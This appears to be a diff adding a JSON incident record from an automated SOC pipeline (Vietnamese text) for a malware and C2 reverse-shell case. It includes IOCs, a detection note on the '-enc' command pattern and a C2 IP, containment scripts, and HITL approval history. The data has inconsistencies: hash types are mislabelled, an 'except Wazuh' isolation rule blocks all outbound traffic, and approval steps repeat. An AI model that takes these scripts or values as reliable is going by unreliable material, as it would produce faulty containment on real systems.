+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          },
+          {
+            "ioc_type": "MD5",
+            "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+            "reputation_score": 85,
+            "is_malicious": true,
+            "threat_actor": "Known Malware Sample",
+            "details": {},
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          },
+          {
+            "ioc_type": "MD5",
+            "value": "SHA256=2B8553835691F46A942E2DA78FF5E742EBE4BE0726B545EB44E68C5E7A215E91",
+            "reputation_score": 85,
+            "is_malicious": true,
+            "threat_actor": "Known Malware Sample",
+            "details": {},
+            "cti_score": null,
+            "first_seen": null,
+            "last_seen": null,
+            "mitre_tactics": [],
+            "is_public": null,
+            "context_source": null
+          }
+        ],
+        "action_plan": [
+          {
+            "action_id": "ACT-MALW-ISOLATE",
+            "action_type": "ISOLATE_HOST",
+            "target": "WIN10-VICTIM-01",
+            "description": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ để ngăn chặn lây lan.",
+            "priority": 1,
+            "require_human_approval": true,
+            "is_approved": true,
+            "parameters": {},
+            "phase": "CONTAINMENT",
+            "script_bundle": {
+              "bundle_id": "BUNDLE-7B191C56",
+              "action_id": "ACT-MALW-ISOLATE",
+              "phase": "CONTAINMENT",
+              "target": "WIN10-VICTIM-01",
+              "powershell_script": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True; New-NetFirewallRule -DisplayName 'BlockAllExceptWazuh' -Direction Outbound -Action Block",
+              "bash_script": "iptables -A OUTPUT -p tcp ! --dport 1514 -j DROP; iptables -A INPUT -p tcp ! --sport 1514 -j DROP",
+              "wazuh_active_response": {
+                "command": "host-isolate",
+                "target": "WIN10-VICTIM-01"
+              },
+              "rollback_script": "Remove-NetFirewallRule -DisplayName 'BlockAllExceptWazuh'; Enable-NetAdapter -Name * -Confirm:$false",
+              "instructions": "Cô lập máy trạm WIN10-VICTIM-01 khỏi mạng nội bộ (giữ kết nối Wazuh Manager). Rollback: gỡ luật cách ly và mở lại card mạng.",
+              "created_at": "2026-10-22T07:24:43.184206Z"
+            }
+          },
+          {
+            "action_id": "ACT-MALW-KILL",
+            "action_type": "KILL_PROCESS",
+            "target": "schtasks.exe",
+            "description": "Tiêu diệt tiến trình độc hại schtasks.exe đang chạy trên máy trạm.",
+            "priority": 2,
+            "require_human_approval": false,
+            "is_approved": true,
+            "parameters": {},
+            "phase": "CONTAINMENT",
+            "script_bundle": {
+              "bundle_id": "BUNDLE-BDB2A96E",
+              "action_id": "ACT-MALW-KILL",
+              "phase": "CONTAINMENT",
+              "target": "schtasks.exe",
+              "powershell_script": "Stop-Process -Name 'schtasks.exe' -Force -ErrorAction SilentlyContinue",
+              "bash_script": "pkill -9 -f 'schtasks.exe'",
+              "wazuh_active_response": {
+                "command": "kill-process",
+                "target": "schtasks.exe"
+              },
+              "rollback_script": null,
+              "instructions": "Tiêu diệt tiến trình độc hại schtasks.exe. Lưu ý: Hành động này không thể hoàn tác tự động (Irreversible).",
+              "created_at": "2026-10-22T07:24:43.184246Z"
+            }
+          },
+          {
+            "action_id": "ACT-MALW-BLOCK",
+            "action_type": "BLOCK_IP",
+            "target": "194.26.29.112",
+            "description": "Chặn địa chỉ IP C2 194.26.29.112 trên Firewall và Web Proxy.",
+            "priority": 1,
+            "require_human_approval": true,
+            "is_approved": true,
+            "parameters": {},
+            "phase": "CONTAINMENT",
+            "script_bundle": {
+              "bundle_id": "BUNDLE-14C949F6",
+              "action_id": "ACT-MALW-BLOCK",
+              "phase": "CONTAINMENT",
+              "target": "194.26.29.112",
+              "powershell_script": "New-NetFirewallRule -DisplayName 'Block_194.26.29.112' -Direction Inbound -Action Block -RemoteAddress 194.26.29.112",
+              "bash_script": "iptables -I INPUT -s 194.26.29.112 -j DROP; iptables -I FORWARD -s 194.26.29.112 -j DROP",
+              "wazuh_active_response": {
+                "command": "firewall-drop",
+                "target": "194.26.29.112"
+              },
+              "rollback_script": "Remove-NetFirewallRule -DisplayName 'Block_194.26.29.112'",
+              "instructions": "Chặn địa chỉ IP độc hại 194.26.29.112 trên Firewall. Rollback: xóa luật chặn iptables/Windows Firewall.",
+              "created_at": "2026-10-22T07:24:43.184271Z"
+            }
+          }
+        ],
+        "attack_type": "Endpoint Malware & C2 Reverse Shell",
+        "attack_category": "MALWARE",
+        "confidence_level": 0.85
+      },
+      "attack_type": "Endpoint Malware & C2 Reverse Shell",
+      "analyst_approved": true,
+      "analyst_feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+      "next_node": "__end__",
+      "error_message": null,
+      "reanalysis_count": 0,
+      "max_reanalysis": 2,
+      "reanalysis_reason": null,
+      "history": [
+        {
+          "timestamp": "2026-10-22T07:24:43.183515Z",
+          "node": "ingestion",
+          "from_status": "NEW",
+          "to_status": "NEW",
+          "message": "Bóc tách thành công 4 sự kiện ParsedEvent từ 4 raw logs",
+          "metadata": {
+            "parsed_count": 4,
+            "raw_count": 4
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:24:43.183653Z",
+          "node": "triage",
+          "from_status": "NEW",
+          "to_status": "INVESTIGATING",
+          "message": "Xác nhận sự cố thực sự (True Positive) - MEDIUM: Wazuh Rule Level cao (12): ; Phát hiện mẫu lệnh độc hại nguy hiểm '-enc'; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (9); Wazuh Rule Level cao (10): ; Kết nối tới IP độc hại C2 đã biết: 194.26.29.112; Wazuh Rule Level trung bình (8)",
+          "metadata": {
+            "is_incident": true,
+            "confidence_score": 0.85,
+            "severity": "MEDIUM",
+            "rule_or_model": "Builtin-Heuristic-Engine"
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:24:43.183981Z",
+          "node": "enrichment",
+          "from_status": "INVESTIGATING",
+          "to_status": "INVESTIGATING",
+          "message": "Tự động hiệu chỉnh sai lệch: Nâng cấp severity từ MEDIUM lên CRITICAL dựa trên CTI (Threat Score: 92)",
+          "metadata": {
+            "escalated": true,
+            "highest_threat_score": 92
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:24:43.183994Z",
+          "node": "enrichment",
+          "from_status": "INVESTIGATING",
+          "to_status": "INVESTIGATING",
+          "message": "Hoàn tất làm giàu dữ liệu tình báo mối đe dọa (CTI Enrichment)",
+          "metadata": {
+            "ioc_count": 3,
+            "mitre_count": 1
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:24:43.184128Z",
+          "node": "rca",
+          "from_status": "INVESTIGATING",
+          "to_status": "INVESTIGATING",
+          "message": "Tái hiện thành công chuỗi tiến trình (Process Lineage) và nguyên nhân gốc rễ",
+          "metadata": {
+            "tree_depth": 4,
+            "initial_vector": "Spearphishing Email / Malicious Attachment"
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:24:43.184289Z",
+          "node": "response",
+          "from_status": "INVESTIGATING",
+          "to_status": "INVESTIGATING",
+          "message": "Đã đề xuất 3 hành động ứng phó khẩn cấp theo NIST SP 800-61",
+          "metadata": {
+            "action_count": 3
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:24:43.184318Z",
+          "node": "hitl_approval",
+          "from_status": "INVESTIGATING",
+          "to_status": "AWAITING_APPROVAL",
+          "message": "Pipeline tạm dừng tại điểm ngắt HITL - Đang chờ chuyên viên phê duyệt hành động",
+          "metadata": {
+            "awaiting_approval": true,
+            "pending_count": 2
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:25:00.808897Z",
+          "node": "hitl_approval",
+          "from_status": "AWAITING_APPROVAL",
+          "to_status": "CONTAINED",
+          "message": "Chuyên viên phê duyệt hành động ứng phó: Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+          "metadata": {
+            "approved": true,
+            "feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL"
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:25:00.809004Z",
+          "node": "reporting",
+          "from_status": "CONTAINED",
+          "to_status": "RESOLVED",
+          "message": "Đã xuất bản thành công Báo cáo Điều tra Toàn diện (Final Incident Report)",
+          "metadata": {
+            "report_id": "REP-INC-MALW-072438"
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:25:02.202355Z",
+          "node": "hitl_approval",
+          "from_status": "RESOLVED",
+          "to_status": "CONTAINED",
+          "message": "Chuyên viên phê duyệt hành động ứng phó: Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL",
+          "metadata": {
+            "approved": true,
+            "feedback": "Chuyên viên SOC đã xác nhận kế hoạch can thiệp trên giao diện Web HITL"
+          }
+        },
+        {
+          "timestamp": "2026-10-22T07:25:02.202446Z",
+          "node": "reporting",
+          "from_status": "CONTAINED",
+          "to_status": "RESOLVED",
+          "message": "Đã xuất bản thành công Báo cáo Điều tra Toàn diện (Final Incident Report)",
+          "metadata": {
+            "report_id": "REP-INC-MALW-072438"
+          }
+        }
+      ],
+      "checkpoints": {
+        "ingestion": {
+          "node": "ingestion",
+          "status": "NEW",
+          "timestamp": "2026-10-22T07:24:43.183548+00:00",
+          "parsed_events_count": 4,
+          "has_triage": false,
+          "has_threat_intel": false,
+          "has_rca": false,
+          "has_report": false
+        },
+        "triage": {
+          "node": "triage",
+          "status": "INVESTIGATING",
+          "timestamp": "2026-10-22T07:24:43.183664+00:00",
+          "parsed_events_count": 4,
+          "has_triage": true,
+          "has_threat_intel": false,
+          "has_rca": false,
+          "has_report": false
+        },
+        "enrichment": {
+          "node": "enrichment",
+          "status": "INVESTIGATING",
+          "timestamp": "2026-10-22T07:24:43.184001+00:00",
+          "parsed_events_count": 4,
+          "has_triage": true,
+          "has_threat_intel": true,
+          "has_rca": false,
+          "has_report": false
+        },
+        "rca": {
+          "node": "rca",
+          "status": "INVESTIGATING",
+          "timestamp": "2026-10-22T07:24:43.184136+00:00",
+          "parsed_events_count": 4,
+          "has_triage": true,
+          "has_threat_intel": true,
+          "has_rca": true,
+          "has_report": false
+        },
+        "response": {
+          "node": "response",
+          "status": "INVESTIGATING",
+          "timestamp": "2026-10-22T07:24:43.184297+00:00",
+          "parsed_events_count": 4,
+          "has_triage": true,
+          "has_threat_intel": true,
+          "has_rca": true,
+          "has_report": false
+        },
+        "hitl_approval": {
+          "node": "hitl_approval",
+          "status": "CONTAINED",
+          "timestamp": "2026-10-22T07:25:02.202387+00:00",
+          "parsed_events_count": 4,
+          "has_triage": true,
+          "has_threat_intel": true,
+          "has_rca": true,
+          "has_report": true
+        },
+        "reporting": {
+          "node": "reporting",
+          "status": "RESOLVED",
+          "timestamp": "2026-10-22T07:25:02.202452+00:00",
+          "parsed_events_count": 4,
+          "has_triage": true,
+          "has_threat_intel": true,
+          "has_rca": true,
+          "has_report": true
+        }
+      }
+    }
+  }
+}
